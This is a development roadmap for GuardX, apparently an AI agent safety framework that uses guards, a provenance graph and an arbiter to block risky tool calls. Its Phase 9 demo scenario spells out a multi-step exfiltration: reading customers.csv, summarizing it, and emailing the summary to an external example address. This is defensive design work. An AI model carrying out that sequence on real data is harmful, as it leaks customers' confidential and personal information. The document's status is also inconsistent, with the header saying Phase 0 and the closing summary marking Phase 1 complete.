# GuardX — Implementation Roadmap

> GuardX is currently in Phase 0.
>
> This roadmap describes planned work.
> A phase appearing here does NOT mean it has been implemented.

---

# Development Principle

GuardX will be built vertically and incrementally.

Every implementation phase should follow:

    Design
      ↓
    Implement
      ↓
    Unit Tests
      ↓
    Security Review
      ↓
    Code Review
      ↓
    Fix
      ↓
    Update CURRENT_STATE.md
      ↓
    Git Commit

Do not build all components simultaneously.

Each phase must have independently testable exit criteria.

---

# Phase 0 — Architecture and Specification

## Objective

Define what GuardX is before implementing it.

## Deliverables

- CLAUDE.md
- README.md
- ARCHITECTURE.md
- DESIGN_DECISIONS.md
- ROADMAP.md
- CURRENT_STATE.md

Resolve enough architecture to begin core implementation.

## Required Decisions

- [x] Python as primary implementation language
- [x] deterministic-first safety
- [x] Guards produce Evidence
- [x] separation of detection and final decision
- [x] Evidence immutability
- [x] no majority voting
- [x] bounded Investigation
- [x] provider independence
- [x] multiple interception points
- [ ] final minimum Evidence schema
- [ ] minimum provenance DAG contract
- [ ] initial safety-property vocabulary
- [ ] initial Risk Memory contract

## Exit Criteria

Phase 0 completes when:

- architecture documents are internally consistent,
- critical interfaces are understood conceptually,
- unresolved questions do not block Phase 1,
- human architecture review approves proceeding.

---

# Phase 1 — Core Domain Model

## Objective

Implement the smallest framework-independent GuardX domain layer.

No LLM provider integrations.

## Deliverables

Python representations for:

- SafetyEvent
- EventType
- RiskCategory
- Severity
- Confidence
- Evidence
- Verdict
- EvaluationContext
- Guard protocol/interface

Potential package structure:

    guardx/
        domain/
            events.py
            evidence.py
            verdict.py
            context.py

        guards/
            base.py

    tests/

Exact structure may change during implementation.

## Tests

Test:

- object validation,
- Evidence immutability,
- enum/value constraints,
- malformed input,
- serialization if required,
- Guard interface contract.

## Exit Criteria

A deterministic fake Guard can:

    SafetyEvent
        ↓
    evaluate(context)
        ↓
    Evidence[]

without requiring any external service.

---

# Phase 2 — Minimal Security Guard

## Objective

Implement the first real Guard end-to-end.

Start deterministic.

## Initial Scope

Potential detections:

- explicit instruction override patterns,
- obvious prompt-injection patterns,
- dangerous tool/action patterns,
- configured blocked resources/destinations.

This is NOT intended to solve prompt injection comprehensively.

## Deliverables

    SecurityGuard
         ↓
    Evidence[]

No LLM required initially.

## Tests

Include:

- benign inputs,
- obvious attacks,
- malformed input,
- multiple findings,
- false-positive-oriented cases.

## Exit Criteria

Security Guard reliably produces valid Evidence through the common Guard
interface.

---

# Phase 3 — Risk Engine / Guard Orchestration

## Objective

Create the core execution pipeline.

## Deliverables

Risk Engine capable of:

- Guard registration,
- applicable-Guard selection,
- async Guard execution,
- timeout handling,
- Evidence collection,
- Guard failure reporting.

Initial pipeline:

    SafetyEvent
        ↓
    EvaluationContext
        ↓
    Risk Engine
        ↓
    Guards
        ↓
    Evidence Set

No sophisticated arbitration yet.

## Tests

- one Guard,
- multiple Guards,
- parallel Guards,
- Guard exception,
- Guard timeout,
- malformed Guard output,
- no applicable Guards.

## Exit Criteria

Multiple deterministic Guards can execute through one stable orchestration
pipeline.

---

# Phase 4 — Privacy and Policy Guards

## Objective

Add safety dimensions needed for action/data-flow experiments.

## Privacy Guard

Initial deterministic capabilities may include:

- credential patterns,
- email/phone identifiers,
- configured sensitive resources,
- sensitive-data labels.

## Policy Guard

Initial capabilities:

- allowed/forbidden actions,
- destination restrictions,
- required approvals,
- permission requirements.

## Content Safety

Content Safety Guard may be introduced here or deferred depending on the
Phase 0/Phase 4 boundary review.

Do not add an LLM merely to ensure all four Guards exist.

## Tests

- sensitive data detection,
- policy allow,
- policy deny,
- approval-required operation,
- overlapping Privacy + Policy findings.

## Exit Criteria

GuardX can demonstrate multiple specialized risk dimensions using a common
Evidence model.

---

# Phase 5 — Deterministic Arbiter Baseline

## Objective

Produce final GuardX Verdicts without LLM reasoning.

## Deliverables

Arbiter consuming:

- Evidence Set,
- policy constraints,
- operation metadata.

Outputs:

- ALLOW
- MODIFY
- BLOCK
- HUMAN_REVIEW

The initial decision policy is explicitly a baseline to be evaluated.

## Important Constraint

Do not equate:

    severity -> verdict

without considering:

- risk category,
- confidence,
- policy,
- operation impact,
- available mitigation.

## Tests

Create decision matrices covering:

- no findings,
- single finding,
- conflicting findings,
- hard policy rule,
- modification available,
- approval required,
- incomplete evidence.

## Exit Criteria

GuardX can run:

    Event
      ↓
    Guards
      ↓
    Evidence
      ↓
    Arbiter
      ↓
    Verdict

completely deterministically.

---

# Phase 6 — Action Provenance DAG (MVP Core)

## Objective

Track safety-relevant data and action lineage in-memory to enable multi-step data-flow analysis.

## Deliverables

Minimal Python DAG abstraction supporting:

- add node (`USER_INPUT`, `MODEL_OUTPUT`, `TOOL_CALL`, `TOOL_RESULT`, `RESOURCE`, `DATA`, `TRANSFORMATION`, `EXTERNAL_DESTINATION`),
- add edge (`READS`, `PRODUCES`, `DERIVED_FROM`, `TRANSFORMS`, `USES`, `SENDS_TO`, `RETURNS`),
- ancestor and parent lookup,
- descendant lookup,
- attach/query semantic safety properties,
- cycle prevention and validation.

Do NOT introduce a graph database. The prototype is purely in-memory Python.

## Example

    customers.csv [RESOURCE]
          │
          ▼ READS
    customer_data [DATA]
       /        \
      ▼          ▼
    names     balances
       \        /
        ▼      ▼ DERIVED_FROM
        summary [DATA]
          │
          ▼ USES / SENDS_TO
      send_email [ACTION]

## Tests

- linear lineage,
- branching and merging,
- multiple parents / multi-source derivation,
- ancestor queries,
- invalid edges / cycle rejection,
- session isolation.

## Exit Criteria

GuardX can answer:
- Where did this data originate?
- Which sources contributed to this value?
- Which downstream action consumed it?

---

# Phase 7 — Semantic Safety Property Propagation (MVP Core)

## Objective

Propagate semantic safety labels through the Provenance DAG.

## Initial Semantic Properties

Candidate vocabulary:

- PII
- CREDENTIAL
- SECRET
- FINANCIAL_DATA
- CONFIDENTIAL
- UNTRUSTED_SOURCE

## Deliverables

Transformation rules supporting:

- **preserve** (e.g., formatting, serialization, summarization preserves CONFIDENTIAL/PII),
- **reduce/remove** (explicit verified sanitization/aggregation),
- **introduce** (external destination introduces transfer risk),
- **combine** (combining separate inputs creates composite properties).

Default behavior is conservative (properties are preserved across transformations unless verified otherwise).

## Tests

- property preservation through copy and summarization,
- verified reduction/removal rules,
- property combination on multi-parent merge nodes,
- conservative propagation defaults.

## Exit Criteria

GuardX can trace semantic properties from a source resource to derived outputs across multiple DAG hops without numerical scores.

---

# Phase 8 — Action Authorization Engine (MVP Core)

## Objective

Protect actual agent/tool execution by combining tool metadata, arguments, destination, and provenance ancestry.

## Deliverables

`ActionRequest` model and pre-execution evaluation pipeline:

    Agent Proposed Tool Call
               │
               ▼
         ActionRequest (tool, args, destination, provenance_refs)
               │
               ▼
         InterceptionPoint.ACTION
               │
               ▼
         Risk Engine (Privacy + Policy + Security Guards)
               │
               ▼
         Arbiter Evaluation (Lineage + Properties + Policy)
               │
               ▼
       ALLOW / MODIFY / BLOCK / HUMAN_REVIEW

## Tests

- allowed tool call with benign arguments,
- forbidden tool call by policy,
- restricted destination with confidential provenance ancestry,
- simulated destructive action blocked or escalated to HUMAN_REVIEW.

## Exit Criteria

GuardX can intercept a proposed tool action and block it before execution based on the provenance ancestry of its arguments.

---

# Phase 9 — Showcase Demonstration & Scenario Suite (MILESTONE: PRESENTABLE MVP)

## Objective

Deliver a runnable, interactive demonstration visualizing GuardX protecting agent workflows across the 4 primary scenarios.

## Scenarios Demonstrated

1. **Benign Request:** Harmless prompt $\rightarrow$ GuardX fast-path $\rightarrow$ `ALLOW`.
2. **Direct Prompt Injection:** Adversarial override attempt $\rightarrow$ Security Guard $\rightarrow$ Evidence $\rightarrow$ `BLOCK`.
3. **Privacy / Policy Violation:** Unauthorized credential or policy violation $\rightarrow$ Privacy/Policy Evidence $\rightarrow$ `BLOCK`.
4. **Showcase (Multi-Step Exfiltration):**
   - Step 1: `read_file("customers.csv")` $\rightarrow$ Provenance node created with `CONFIDENTIAL` + `PII`.
   - Step 2: `summarize()` $\rightarrow$ Summary node created; `CONFIDENTIAL` property propagated.
   - Step 3: `send_email("external@example.com", body=summary)` $\rightarrow$ Action Authorization intercepts action $\rightarrow$ Ancestry checked $\rightarrow$ Policy & Privacy Guards emit Evidence $\rightarrow$ Arbiter returns `BLOCK`.

## Architecture of the Demo

- **Real:** GuardX domain models, Guards, Risk Engine, Arbiter, Provenance DAG, Property Propagation, Action Authorization, Verdicts.
- **Simulated:** Mock file store, dummy agent prompt, mock external tool execution.
- **Interface:** Clean CLI / Terminal UI or lightweight visualization displaying the live event stream, DAG graph, Evidence cards, and final Arbiter decisions.

## Exit Criteria

A non-technical or technical stakeholder can run the demonstration, inspect the provenance graph, and see real GuardX logic intercepting attacks.

---

# Phase 10 — Risk Memory (Post-MVP Core)

## Objective

Add session-scoped safety state for detecting cross-turn attack progression across independent user turns.

## Deliverables

Risk Memory supporting:

- create entry,
- query relevant entries,
- resolve entry,
- expire entry,
- session isolation,
- data minimization.

## Tests

- session isolation,
- expiry and resolution,
- multi-turn attack detection where individual turns appear benign.

---

# Phase 11 — Disagreement Detection & Bounded Investigation (Post-MVP Core)

## Objective

Detect meaningful conflicts and trigger bounded investigation for uncertain or high-impact events.

## Deliverables

- Disagreement detector evaluating category relationships, severity, and confidence.
- Bounded Investigation runner (max 1 iteration, timeouts, loop prevention).
- Linked Evidence generation ($E_2$ referencing $E_1$).

---

# Phase 12 — Full MODIFY Workflow (Post-MVP Core)

## Objective

Implement full `ModificationPlan` generation, host application patching, and mandatory re-evaluation before execution.

---

# Phase 13 — Audit System (Post-MVP Core)

## Objective

Structured, append-oriented audit recording for complete decision reconstructability.

---

# Phase 14 — Content Safety & Model-Based Guard Experiments (Research)

## Objective

Empirical ablation testing comparing deterministic Guards against model-assisted Guards.

---

# Phase 15 — Model-Assisted Arbitration Experiment (Research)

## Objective

Evaluate whether model-assisted arbitration improves ambiguous decisions when deterministic rules are insufficient.

---

# Phase 16 — Evaluation Framework & Baselines (Research)

## Objective

Run systematic benchmark suites across baselines $B_0$ through $B_6$ measuring precision, recall, latency, and cost.

---

# Phase 17 — Production Hardening & Packaging

## Objective

Packaging, performance profiling, and developer documentation.

---

# Phase 18 — Research Analysis

## Objective

Empirical analysis and literature review establishing scientific findings.

---

# Development Order Summary

```
    Phase 0: Architecture & Specification (Completed)
        │
    Phase 1: Core Domain Model & Interfaces (Completed)
        │
    Phase 2: Minimal Security Guard
        │
    Phase 3: Risk Engine & Guard Orchestration
        │
    Phase 4: Privacy & Policy Guards
        │
    Phase 5: Deterministic Arbiter Baseline
        │
    ══════════════════════════════════════════════
    ★ MILESTONE 1: FIRST WORKING GUARDX CORE ★
    ══════════════════════════════════════════════
        │
    Phase 6: Action Provenance DAG (In-Memory)
        │
    Phase 7: Semantic Property Propagation
        │
    Phase 8: Action Authorization Engine
        │
    Phase 9: Showcase Demonstration & Scenarios
        │
    ══════════════════════════════════════════════
    ★ MILESTONE 2: FIRST PRESENTABLE GUARDX DEMO ★
    ══════════════════════════════════════════════
        │
    Phase 10: Risk Memory (Cross-turn state)
        │
    Phase 11: Disagreement & Bounded Investigation
        │
    Phase 12: Full MODIFY Workflow
        │
    Phase 13: Audit System
        │
    Phases 14-15: Model-Assisted Experiments
        │
    Phase 16: Evaluation Framework ($B_0 \to B_6$)
        │
    Phase 17: Production Hardening
        │
    Phase 18: Research Analysis
```